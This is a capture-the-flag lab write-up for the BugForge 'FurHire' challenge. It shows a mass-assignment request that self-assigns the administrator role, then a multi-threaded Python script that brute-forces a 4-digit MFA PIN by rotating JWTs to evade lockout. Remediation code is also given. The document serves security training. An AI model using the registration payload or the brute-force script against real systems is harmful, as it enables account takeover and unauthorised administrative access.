---
layout: default
title: "FurHire MFA Bypass (Mass Assignment, MFA Brute Force) - BugForge"
---

[← Back](./)

# BugForge - FurHire MFA Bypass Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-02-28</span>
  <span><strong>Difficulty:</strong> Medium</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. Mass Assignment (CWE-915) — Self-assign administrator role during registration
2. Weak MFA Implementation (CWE-308) — Lockout tied to JWT, not user account; PIN rotates per session
3. Insufficient Rate Limiting (CWE-307) — No throttle on login endpoint enables rapid JWT rotation

**Business Impact:** Complete administrative access bypass. An attacker can register as an administrator and brute force the MFA gate to gain full access to the admin panel and all protected resources.

---

## Objective

Bypass authentication and MFA controls to access the admin panel and retrieve the flag.

## Initial Access

```bash
# Target Application
URL: https://lab-1772235076111-2pzdfx.labs-app.bugforge.io

# Credentials (self-registered via mass assignment)
Username: attacker
Password: password
Role: administrator
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **Mass Assignment (CWE-915)** — `/api/register` accepts a `role` field, allowing users to self-assign `administrator`
2. **Weak MFA - JWT-Scoped Lockout (CWE-308)** — Account lockout after 15 failed MFA attempts is tracked per JWT, not per user. Re-logging in resets the counter and generates a new PIN
3. **No Login Rate Limiting (CWE-307)** — Unlimited login requests allow rapid JWT cycling

**CVSS v3.1 Score for Mass Assignment:** **8.8 (High)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity | High |
| Availability | Low |

## Enumeration Summary

### Application Analysis

**Target Endpoints Discovered:**
- `POST /api/register` — User registration (mass assignment vector)
- `POST /api/login` — Authentication, returns JWT
- `POST /api/mfa/verify` — MFA PIN verification (Authorization: Bearer)
- `GET /api/admin/content` — Protected admin panel with flag

**Summary:**
- **Framework:** Express.js (X-Powered-By: Express)
- **Auth:** JWT Bearer tokens
- **MFA:** 4-digit numeric PIN, lockout at 15 attempts per JWT
- **Lockout scope:** JWT session, not user account

## Attack Chain Visualization

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│  POST /api/      │     │  POST /api/login  │     │  POST /api/mfa/ │
│  register        │────▶│                   │────▶│  verify         │
│                  │     │  Returns JWT +    │     │                 │
│  role:           │     │  needsOnboarding  │     │  12 attempts    │
│  "administrator" │     │                   │     │  per JWT        │
└─────────────────┘     └──────────────────┘     └────────┬────────┘
                                                          │
                              ┌────────────────┐          │ Lockout?
                              │  Re-login for   │◀─────────┘ Rotate!
                              │  fresh JWT +    │
                              │  new PIN        │──────────┐
                              └────────────────┘          │
                                                          ▼
                                                ┌─────────────────┐
                                                │ GET /api/admin/ │
                                                │ content         │
                                                │                 │
                                                │ FLAG extracted  │
                                                └─────────────────┘
```

**Attack Path Summary:**
1. Register account with `"role": "administrator"` in request body
2. Login to receive JWT — redirected to MFA verification
3. Attempt 12 MFA PINs per JWT (staying under 15 lockout threshold)
4. On lockout or batch exhaustion, re-login for fresh JWT + new random PIN
5. Run multiple threads in parallel to maximize hit probability
6. On successful MFA verify, fetch `/api/admin/content` and extract flag

---

## Exploitation Path

### Step 1: Mass Assignment — Register as Administrator

The registration endpoint blindly accepts a `role` field in the JSON body. The UI only sends `username`, `email`, `full_name`, and `password`, but adding `role` to the request body escalates privileges.

```http
POST /api/register HTTP/1.1
Host: lab-1772235076111-2pzdfx.labs-app.bugforge.io
Content-Type: application/json

{
    "role": "administrator",
    "username": "attacker",
    "email": "attacker@test.com",
    "full_name": "admin",
    "password": "password"
}
```

**Response (200 OK):**
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": {
        "id": 10,
        "username": "attacker",
        "email": "attacker@test.com",
        "full_name": "admin",
        "role": "administrator"
    },
    "needsOnboarding": true
}
```

The response confirms `"role": "administrator"` — mass assignment successful.

### Step 2: Login and Discover MFA Gate

Logging in with the admin account returns a JWT but requires MFA verification before accessing protected resources.

```http
POST /api/login HTTP/1.1
Host: lab-1772235076111-2pzdfx.labs-app.bugforge.io
Content-Type: application/json

{"username":"attacker","password":"password"}
```

### Step 3: Identify MFA Weakness

Testing revealed the critical design flaw:
- **4-digit PIN** — only 10,000 possible values
- **Lockout after ~15 failed attempts** — but lockout is tracked per JWT
- **Re-logging in** generates a fresh JWT with a **new random PIN** and resets the counter
- **No rate limit on `/api/login`** — unlimited JWT rotation

This means each JWT gives 12 safe guesses at a random 4-digit PIN (0.12% chance per JWT). The attack becomes probabilistic rather than deterministic.

### Step 4: Multi-Threaded MFA Brute Force

Built a Python script with 5 parallel threads, each independently cycling through login → brute force → rotate:

```python
BATCH_SIZE = 12      # attempts per JWT (under 15 lockout)
THREADS = 5          # parallel workers
ROLLBACK = 5         # rewind on 403

# Each thread independently:
# 1. Login → get JWT (with its own random PIN)
# 2. Try 12 PINs from its assigned range
# 3. On lockout → re-login for fresh JWT
# 4. On non-400 response → HIT — extract flag
```

**MFA verify request:**
```http
POST /api/mfa/verify HTTP/1.1
Authorization: Bearer <jwt_token>
Content-Type: application/json

{"pin":"1234"}
```

**Failed (400):** `{"error": "Invalid PIN"}`

### Step 5: Flag Extraction

On successful MFA verification (HTTP 200), the script immediately fetches the admin content and regex-extracts the flag:

```python
admin_resp = requests.get(
    f"{BASE_URL}/api/admin/content",
    headers={"Authorization": f"Bearer {token}"}
)
flag = re.search(r'bug\{[^}]+\}', admin_resp.text)
```

---

## Flag / Objective Achieved

✅ **Flag:** `bug{nxLzuIewnNEgvx3z77fbVICUcHYTGZTy}`

Retrieved from the admin panel HTML served by `/api/admin/content` after successful MFA bypass.

---

## Key Learnings

- **Mass assignment** is easy to miss if you only look at the UI — always compare what the frontend sends vs. what the API accepts
- **JWT-scoped lockout is fundamentally broken** — lockout must be tied to the user identity in persistent storage, not the ephemeral session token
- **Rotating PINs don't help** if an attacker can generate unlimited sessions — it just changes the attack from deterministic to probabilistic
- **Multi-threading** turns a 0.12% per-JWT chance into a practical attack by cycling many JWTs simultaneously

| Design Flaw | Why It's Exploitable |
|-------------|---------------------|
| Role accepted in registration body | Server trusts client-supplied role |
| Lockout tied to JWT | New JWT = reset counter + new PIN |
| 4-digit PIN | Only 10,000 combinations |
| No login rate limit | Unlimited JWT rotation |

---

## Tools Used

- **Burp Suite** — Request interception, discovering mass assignment in registration
- **Python (requests + threading)** — Multi-threaded MFA brute force script
- **Custom mfa_brute.py** ([full script below](#brute-force-script)) — Full exploit: login → rotate JWTs → brute force MFA → extract flag

---

## Remediation

### 1. Mass Assignment (CVSS: 8.8 - High)

**Issue:** Server accepts and processes `role` field from user-controlled registration input

**CWE Reference:** CWE-915 - Improperly Controlled Modification of Dynamically-Determined Object Attributes

**Fix:**

```javascript
// BEFORE (Vulnerable)
app.post('/api/register', (req, res) => {
  const user = User.create(req.body); // accepts ALL fields
});

// AFTER (Secure)
app.post('/api/register', (req, res) => {
  const { username, email, full_name, password } = req.body;
  const user = User.create({ username, email, full_name, password, role: 'user' });
});
```

### 2. Weak MFA - JWT-Scoped Lockout (CVSS: 7.5 - High)

**Issue:** MFA lockout counter is tied to the JWT session, not the user account. Re-authenticating resets everything.

**CWE Reference:** CWE-308 - Use of Single-factor Authentication

**Fix:**

```javascript
// BEFORE (Vulnerable) - lockout in session
if (session.mfaAttempts >= 15) return res.status(429).json({error: "Locked"});

// AFTER (Secure) - lockout in database against user
const user = await User.findById(userId);
if (user.mfaLockoutUntil > Date.now()) return res.status(429).json({error: "Locked"});
if (user.mfaAttempts >= 5) {
  user.mfaLockoutUntil = Date.now() + 15 * 60 * 1000; // 15 min lockout
  await user.save();
  return res.status(429).json({error: "Locked"});
}
```

### 3. Insufficient Rate Limiting (CVSS: 5.3 - Medium)

**Issue:** No rate limiting on `/api/login` enables unlimited JWT rotation

**CWE Reference:** CWE-307 - Improper Restriction of Excessive Authentication Attempts

**Fix:**

```javascript
const rateLimit = require('express-rate-limit');
app.use('/api/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: "Too many login attempts" }
}));
```

---

## Failed Attempts

### Approach 1: Single-Threaded Linear Brute Force

```
Iterate 0000-9999 sequentially, rotating JWT every 12 attempts
```

**Result:** ❌ Failed — PIN rotates with each JWT, so linear sweep through the range doesn't help. Need to get lucky within 12 guesses on any given JWT.

### Approach 2: Single-Threaded with JWT Rotation

```
Same approach but understanding PIN rotation — just one thread cycling JWTs
```

**Result:** ❌ Too slow — Only one JWT cycling at a time means fewer chances per second. Required running the script multiple times to get a hit.

---

## OWASP Top 10 Coverage

- **A01:2021** - Broken Access Control (Mass assignment allows role escalation to administrator)
- **A07:2021** - Identification and Authentication Failures (MFA lockout bypass via JWT rotation, weak 4-digit PIN)
- **A04:2021** - Insecure Design (Lockout mechanism tied to session token instead of user identity)

---

## References

**Mass Assignment Resources:**
- [OWASP Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)

**Authentication & MFA Resources:**
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-308: Use of Single-factor Authentication](https://cwe.mitre.org/data/definitions/308.html)
- [OWASP Testing Guide - Testing for Brute Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Brute_Force)

---

## Brute Force Script

Full `mfa_brute.py` used for the multi-threaded MFA bypass:

```python
#!/usr/bin/env python3
"""
MFA PIN brute forcer - BugForge CTF Lab
Multi-threaded: each thread gets its own JWT and tries a batch of PINs.
Since PIN rotates per JWT, more threads = more chances per second.
"""

import re
import requests
import subprocess
import sys
import threading
import time

BASE_URL = "https://lab-1772235076111-2pzdfx.labs-app.bugforge.io"
LOGIN_URL = f"{BASE_URL}/api/login"
MFA_URL = f"{BASE_URL}/api/mfa/verify"

CREDS = {"username": "attacker", "password": "password"}
BATCH_SIZE = 12      # attempts per JWT
THREADS = 5          # parallel workers
ROLLBACK = 5         # rewind on 403

found = threading.Event()  # signal all threads to stop
lock = threading.Lock()


def login(session):
    """Login and return fresh JWT."""
    resp = session.post(LOGIN_URL, json=CREDS)
    data = resp.json()
    token = data.get("token")
    if not token:
        with lock:
            print(f"[!] Login failed: {data}")
        return None
    return token


def handle_hit(pin, token, resp):
    """Handle a successful MFA hit — immediately fetch /admin."""
    found.set()
    print(f"\n{'='*60}")
    print(f"[!!!] HIT: status={resp.status_code} pin={pin}")
    print(f"[!!!] JWT: {token}")
    print(f"[!!!] Body: {resp.text}")

    # Fetch /api/admin/content and extract flag
    print(f"\n[!!!] Fetching /api/admin/content ...")
    admin_resp = requests.get(
        f"{BASE_URL}/api/admin/content",
        headers={"Authorization": f"Bearer {token}"}
    )
    flag = re.search(r'bug\{[^}]+\}', admin_resp.text)
    if flag:
        print(f"\n[!!!] FLAG: {flag.group()}")
    else:
        print(f"[!!!] No flag found in response:\n{admin_resp.text[:500]}")

    print(f"{'='*60}")


def worker(thread_id, pin_range):
    """Worker thread: cycles through its PIN range, rotating JWTs."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Content-Type": "application/json",
        "Origin": BASE_URL,
        "Referer": f"{BASE_URL}/login",
    })

    pins = [f"{p:04d}" for p in pin_range]
    i = 0
    jwt_count = 0

    while not found.is_set():
        # Get fresh JWT
        token = login(session)
        if not token:
            time.sleep(2)
            continue
        jwt_count += 1

        # Try a batch of PINs
        for attempt in range(BATCH_SIZE):
            if found.is_set():
                return

            pin = pins[i % len(pins)]
            headers = {"Authorization": f"Bearer {token}"}
            resp = session.post(MFA_URL, json={"pin": pin}, headers=headers)

            if resp.status_code == 403:
                with lock:
                    print(f"  [T{thread_id}] 403 at {pin} | Sleeping 5s | Rolling back {ROLLBACK}")
                time.sleep(5)
                i = max(0, i - ROLLBACK)
                break  # get new JWT

            if resp.status_code == 429 or "locked" in resp.text.lower():
                with lock:
                    print(f"  [T{thread_id}] Lockout at {pin} | Getting new JWT")
                break  # get new JWT

            if resp.status_code != 400:
                handle_hit(pin, token, resp)
                return

            i += 1

        # Log progress periodically
        if jwt_count % 10 == 0:
            with lock:
                current_pin = pins[i % len(pins)]
                print(f"  [T{thread_id}] {jwt_count} JWTs used | Current position: {current_pin}")


def main():
    num_threads = int(sys.argv[1]) if len(sys.argv) > 1 else THREADS

    # Split the PIN range across threads so they cover different ground
    all_pins = list(range(10000))
    chunk_size = len(all_pins) // num_threads

    threads = []
    for t in range(num_threads):
        start = t * chunk_size
        end = start + chunk_size if t < num_threads - 1 else 10000
        pin_range = all_pins[start:end]

        th = threading.Thread(target=worker, args=(t, pin_range), daemon=True)
        threads.append(th)

    odds_per_jwt = BATCH_SIZE / 10000 * 100
    print(f"[*] MFA Brute Force - Multi-threaded")
    print(f"[*] {num_threads} threads, {BATCH_SIZE} attempts per JWT")
    print(f"[*] Each JWT has {odds_per_jwt:.1f}% chance | {num_threads} JWTs in parallel")
    print(f"[*] Each thread covers {chunk_size} PINs of the range")
    print(f"[*] Press Ctrl+C to stop\n")

    for th in threads:
        th.start()

    try:
        while not found.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user")
        found.set()

    for th in threads:
        th.join(timeout=5)

    if not found.is_set():
        print("\n[-] No hit found")


if __name__ == "__main__":
    main()
```

**Usage:**
```bash
# Default 5 threads
python3 mfa_brute.py

# Custom thread count
python3 mfa_brute.py 10
```

---

**Tags:** `#mass-assignment` `#mfa-bypass` `#brute-force` `#jwt` `#bugforge` `#access-control`
